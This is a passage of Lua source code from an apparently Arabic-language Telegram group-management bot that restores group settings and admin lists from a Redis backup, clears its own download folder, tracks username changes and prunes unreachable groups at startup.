	black..'lock_bots'..k,true,
	black..'mute_forward'..k,true,
	black..'mute_contact'..k,true,
	black..'mute_document'..k,true,
	black..'mute_inline'..k,true,
	black..'lock_username'..k,true,
	black..'replay'..k,true
	)
	redis:sadd(black..'group:ids',k) 

	if IDS.Admins then
	for user,ID in pairs(IDS.Admins) do
	redis:hset(black..'username:'..ID,'username',user)
	redis:sadd(black..'admins:'..k,ID)
	end
	end
	if IDS.Creator then
	for user,ID in pairs(IDS.Creator) do
	redis:hset(black..'username:'..ID,'username',user)
	redis:sadd(black..':MONSHA_BOT:'..k,ID)
	end
	end
	if IDS.Owner then
	for user,ID in pairs(IDS.Owner) do
	redis:hset(black..'username:'..ID,'username',user)
	redis:sadd(black..'owners:'..k,ID)
	end
	end
	end
	io.popen("rm -fr ../.telegram-cli/data/document/*")
	sendMsg(Uploaded_Groups_CH,Uploaded_Groups_MS,'• ** تم رفع النسخه‏‏ الاحتياطيه\n• ** حالياً عدد مجموعاتك هيه‏ *'..redis:scard(black..'group:ids')..' .*\n')
	end
	elseif data.ID == "UpdateUser" then  
	if data.user_.type_.ID == "UserTypeDeleted" then
	print("¦ userTypeDeleted")
	redis:srem(black..'users',data.user_.id_)
	elseif data.user_.type_.ID == "UserTypeGeneral" then
	local CheckUser = redis:hgetall(black..'username:'..data.user_.id_).username
	if data.user_.username_  then 
	USERNAME = '@'..data.user_.username_:gsub('_',[[\_]])
	else
	USERNAME = data.user_.first_name_..' '..(data.user_.last_name_ or "" )
	end	
	if CheckUser and CheckUser ~= USERNAME  then
	print("¦ Enter Update User ")
	redis:hset(black..'username:'..data.user_.id_,'username',USERNAME)
	end 
	end
	elseif data.ID == "UpdateMessageEdited" then
	GetMsgInfo(data.chat_id_,data.message_id_,function(arg,data)
	msg = data
	msg.edited = true
	data.text = (data.content_.text_ or false)
	input_inFo(msg)  
	end,nil)
	elseif data.ID == "UpdateOption" and data.value_.value_ == "Ready" then
	print(" ||  ------------------------[ Loading For loding list Chat ]--------------------- ||")
	local groups = redis:smembers(black..'group:ids')
	local GroupsIsFound = 0
	for i = 1, #groups do 
	GroupTitle(groups[i],function(arg,data)
	if data.code_ and data.code_ == 400 then
	rem_data_group(groups[i])
	print(" Del Group From list ")
	else
	if data.type_ and data.type_.channel_ 
	and data.type_.channel_.status_.ID == "ChatMemberStatusMember" then
	StatusLeft(groups[i],our_id)
	rem_data_group(groups[i])
	print(" Del Group From list ")
	end
	print(" Name Group : "..data.title_)
	GroupsIsFound = GroupsIsFound + 1
	end
	print(GroupsIsFound..' : '..#groups..' : '..i)
	if #groups == i then
	
	local pv = redis:smembers(black..'users')
	local NumPvDel = 0
	for i = 1, #pv do
	GroupTitle(pv[i],function(arg,data)
	NumPvDel = NumPvDel + 1
	print("Geting Ok : "..NumPvDel)
	end)
	end
	
	end
	end)
	end
	

	end
	
	
end
